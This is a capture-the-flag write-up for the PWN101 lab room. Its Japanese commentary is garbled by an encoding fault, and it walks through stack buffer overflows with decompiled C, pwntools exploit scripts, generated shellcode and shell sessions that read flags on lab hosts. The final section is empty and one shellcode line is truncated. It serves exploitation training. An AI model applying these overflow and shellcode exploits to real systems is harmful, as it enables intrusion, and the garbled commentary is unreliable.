# PWN101 CTF

https://tryhackme.com/room/pwn101

## 1

```c
void main(void)
{
  char local_48 [60];
  int local_c;

  local_c = 0x539;
  setup();
  banner();
  puts(
      "Hello!, I am going to shopping.\nMy mom told me to buy some ingredients.\nUmmm.. But I have l ow memory capacity, So I forgot most of them.\nAnyway, she is preparing Briyani for lunch, Can  you help me to buy those items :D\n"
      );
  puts("Type the required ingredients to make briyani: ");
  gets(local_48);
  if (local_c == 0x539) {
    puts("Nah bruh, you lied me :(\nShe did Tomato rice instead of briyani :/");
                    /* WARNING: Subroutine does not return */
    exit(0x539);
  }
  puts("Thanks, Here\'s a small gift for you <3");
  system("/bin/sh");
  return;
}
```

ãƒãƒƒãƒ•ã‚¡ãƒ¼ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã§ local_c ã®å€¤ã‚’å¤‰ãˆã‚Œã°è‰¯ã„ã ã‘ã€‚

```shell
$ nc 10.10.36.52 9001
       â”Œâ”¬â”â”¬â”€â”â”¬ â”¬â”¬ â”¬â”Œâ”€â”â”Œâ”€â”â”¬â”Œâ”€â”Œâ”¬â”â”Œâ”€â”
        â”‚ â”œâ”¬â”˜â””â”¬â”˜â”œâ”€â”¤â”œâ”€â”¤â”‚  â”œâ”´â”â”‚â”‚â”‚â”œâ”¤
        â”´ â”´â””â”€ â”´ â”´ â”´â”´ â”´â””â”€â”˜â”´ â”´â”´ â”´â””â”€â”˜
                 pwn 101

Hello!, I am going to shopping.
My mom told me to buy some ingredients.
Ummm.. But I have low memory capacity, So I forgot most of them.
Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D

Type the required ingredients to make briyani:
123456789012345678901234567890123456789012345678901234567890
Thanks, Here's a small gift for you <3
ls
flag.txt
pwn101
pwn101.c
cat flag.txt
THM{ã²ã¿ã¤}
```

## 2

```c
void main(void)
{
  undefined local_78 [104];
  int local_10;
  int local_c;

  setup();
  banner();
  local_c = 0xbadf00d;
  local_10 = -0x11e2153;
  printf("I need %x to %x\nAm I right? ",0xbadf00d,0xfee1dead);
  __isoc99_scanf(&DAT_00100b66,local_78);
  if ((local_c == 0xc0ff33) && (local_10 == 0xc0d3)) {
    printf("Yes, I need %x to %x\n",0xc0ff33,0xc0d3);
    system("/bin/sh");
    return;
  }
  puts("I\'m feeling dead, coz you said I need bad food :(");
                    /* WARNING: Subroutine does not return */
  exit(0x539);
}
```

2 ã¤ã®ãƒ­ãƒ¼ã‚«ãƒ«å¤‰æ•°ã®å€¤ã‚’ç‹™ã£ãŸå€¤ã§ä¸Šæ›¸ãã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã€‚

```python
from pwn import *

connect = remote('10.10.36.52', 9002)
connect.recvuntil(b"Am I right? ")

padding = b'A' * 104
payload = padding + p32(0xc0d3) + p32(0xc0ff33)
connect.send(payload)
connect.interactive()
```

```shell
$ python ./task2.py
[+] Opening connection to 10.10.36.52 on port 9002: Done
[*] Switching to interactive mode
$ ls
Yes, I need c0ff33 to c0d3
$ ls
flag.txt
pwn102
pwn102.c
$ cat flag.txt
THM{ã²ã¿ã¤}
```

## 3

```c
void general(void)
{
  int iVar1;
  char local_28 [32];

  puts(&DAT_004023aa);
  puts(&DAT_004023c0);
  puts(&DAT_004023e8);
  puts(&DAT_00402418);
  printf("------[pwner]: ");
  __isoc99_scanf(&DAT_0040245c,local_28);
  iVar1 = strcmp(local_28,"yes");
  if (iVar1 == 0) {
    puts(&DAT_00402463);
    main();
  }
  else {
    puts(&DAT_0040247f);
  }
  return;
}

void admins_only(void)
{
  puts(&DAT_00403267);
  puts(&DAT_0040327c);
  system("/bin/sh");
  return;
}
```

- general é–¢æ•°ã«ãƒãƒƒãƒ•ã‚¡ãƒ¼ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã®è„†å¼±æ€§ãŒã‚ã‚‹
- å‘¼ã°ã‚Œã¦ã„ãªã„ã€admins_only é–¢æ•°ãŒå­˜åœ¨ã™ã‚‹

```
pwndbg> info address admins_only
Symbol "admins_only" is at 0x401554 in a file compiled without debugging.
```

3 ã‚’å…¥åŠ›ã—ã¦ general é–¢æ•°ã®å‡¦ç†ã«é€²ã¿ã€ãã“ã§ãƒãƒƒãƒ•ã‚¡ãƒ¼ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’é€ã‚‹ã€‚

```python
from pwn import *

elf = context.binary = ELF('./pwn103-1644300337872.pwn103')
p = remote('10.10.36.52', 9003)

win_addr = elf.symbols['admins_only']

ret_gadget = ROP(elf).find_gadget(['ret'])[0]

# general channel ã‚’é¸æŠ
p.sendlineafter(b'Choose the channel: ', b'3')

offset = 40
payload = b'A' * offset
payload += p64(ret_gadget)  # Add the ret gadget to fix alignment
payload += p64(win_addr)

p.sendlineafter(b'------[pwner]: ', payload)

p.interactive()
```

ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ

```shell
$ python ./task3.py
[*] '/home/kali/CTF/0430/pwn103-1644300337872.pwn103'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[+] Opening connection to 10.10.36.52 on port 9003: Done
/usr/lib/python3/dist-packages/ropgadget/gadgets.py:277: SyntaxWarning: invalid escape sequence '\?'
  [b"\xd6\?[\x00-\x03]{1}[\x00\x20\x40\x60\x80\xa0\xc0\xe0]{1}", 4, 4]  # blr reg # noqa: W605 # FIXME: \?
/usr/lib/python3/dist-packages/ropgadget/gadgets.py:282: SyntaxWarning: invalid escape sequence '\?'
  [b"[\x00\x20\x40\x60\x80\xa0\xc0\xe0]{1}[\x00-\x03]{1}\?\xd6", 4, 4]  # blr reg # noqa: W605 # FIXME: \?
/usr/lib/python3/dist-packages/ropgadget/ropchain/arch/ropmakerx64.py:29: SyntaxWarning: invalid escape sequence '\['
  regex = re.search("mov .* ptr \[(?P<dst>([(rax)|(rbx)|(rcx)|(rdx)|(rsi)|(rdi)|(r9)|(r10)|(r11)|(r12)|(r13)|(r14)|(r15)]{3}))\], (?P<src>([(rax)|(rbx)|(rcx)|(rdx)|(rsi)|(rdi)|(r9)|(r10)|(r11)|(r12)|(r13)|(r14)|(r15)]{3}))$", f)
/usr/lib/python3/dist-packages/ropgadget/ropchain/arch/ropmakerx86.py:29: SyntaxWarning: invalid escape sequence '\['
  regex = re.search("mov dword ptr \[(?P<dst>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))\], (?P<src>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))$", f)
[*] Loaded 14 cached gadgets for './pwn103-1644300337872.pwn103'
[*] Switching to interactive mode
Try harder!!! ğŸ’ª
ğŸ‘®  Admins only:

Welcome admin ğŸ˜„
$ ls
flag.txt
pwn103
pwn103.c
$ cat flag.txt
THM{ã²ã¿ã¤}
```

## 4

```c
void main(void)
{
  undefined local_58 [80];

  setup();
  banner();
  puts(&DAT_00402120);
  puts(&DAT_00402148);
  puts(&DAT_00402170);
  printf("I\'m waiting for you at %p\n",local_58);
  read(0,local_58,200);
  return;
}
```

- ãƒãƒƒãƒ•ã‚¡ãƒ¼ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’è¡¨ç¤ºã—ã¦ã„ã‚‹
- 120 ãƒã‚¤ãƒˆè¶…éã—ã¦ read ã—ã¦ã„ã‚‹

```shell
$ pwn shellcraft amd64.linux.execve "/bin///sh" "['sh', '-p']" -f s
"jhH\xb8\x2fbin\x2f\x2f\x2fsPH\x89\xe7H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8ri\x01,q\x01\x01\x01H1\x04\x241\xf6Vj\x0b^H\x01\xe6Vj\x10^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05"
```

ãƒãƒƒãƒ•ã‚¡ãƒ¼ã®å…ˆé ­ã‹ã‚‰ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’æŒ¿å…¥ã—ãŸã‚‰ã€ä¸Šæ›¸ãã•ã‚Œã¦ã†ã¾ãæ©Ÿèƒ½ã—ãªã‹ã£ãŸã€‚  
ãƒãƒƒãƒ•ã‚¡ãƒ¼ã®å¾Œã‚ã®æ–¹ã‚’ä½¿ã†æ–¹ãŒæˆåŠŸã—ã‚„ã™ã„ã¨æ€ã‚ã‚Œã‚‹ã€‚

```python
from pwn import *

elf = context.binary = ELF('./pwn104-1644300377109.pwn104')
connect = remote('10.10.36.52', 9004)
#connect = process('./pwn104-1644300377109.pwn104')

while True:
    line = connect.recvline().decode()
    log.info(f"{line.strip()}")
    if "waiting for you at " in line:
        break

match = re.search(r"waiting for you at 0x([0-9a-fA-F]+)", line)
if match:
    buf_addr = int(match.group(1), 16)
    log.info(f"[+] buf address: {hex(buf_addr)}")
else:
    log.error("buffer ã‚¢ãƒ‰ãƒ¬ã‚¹ã®æŠ½å‡ºã«å¤±æ•—ã—ã¾ã—ãŸ")
    sys.exit(1)

padding = b'A' * 88
nop_slide = b"\x90" * 20
shellcode = b"jhH\xb8\x2fbin\x2f\x2f\x2fsPH\x89\xe7H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8ri\x01,q\x01\x01\x01H>
payload = padding + p64(buf_addr + 100) + nop_slide + shellcode

connect.send(payload)
connect.interactive()
```

ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ

```shell
$ python ./task4.py
[*] '/home/kali/CTF/0430/pwn104-1644300377109.pwn104'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
[+] Opening connection to 10.10.36.52 on port 9004: Done
[*] â”Œâ”¬â”â”¬â”€â”â”¬ â”¬â”¬ â”¬â”Œâ”€â”â”Œâ”€â”â”¬â”Œâ”€â”Œâ”¬â”â”Œâ”€â”
[*] â”‚ â”œâ”¬â”˜â””â”¬â”˜â”œâ”€â”¤â”œâ”€â”¤â”‚  â”œâ”´â”â”‚â”‚â”‚â”œâ”¤
[*] â”´ â”´â””â”€ â”´ â”´ â”´â”´ â”´â””â”€â”˜â”´ â”´â”´ â”´â””â”€â”˜
[*] pwn 104
[*]
[*] I think I have some super powers ğŸ’ª
[*] especially executable powers ğŸ˜ğŸ’¥
[*]
[*] Can we go for a fight? ğŸ˜ğŸ’ª
[*] I'm waiting for you at 0x7ffd858b57f0
[*] [+] buf address: 0x7ffd858b57f0
[*] Switching to interactive mode
$ ls
flag.txt
pwn104
pwn104.c
$ cat flag.txt
THM{ã²ã¿ã¤}
```

## 5

```c

```

```python

```

```shell

```
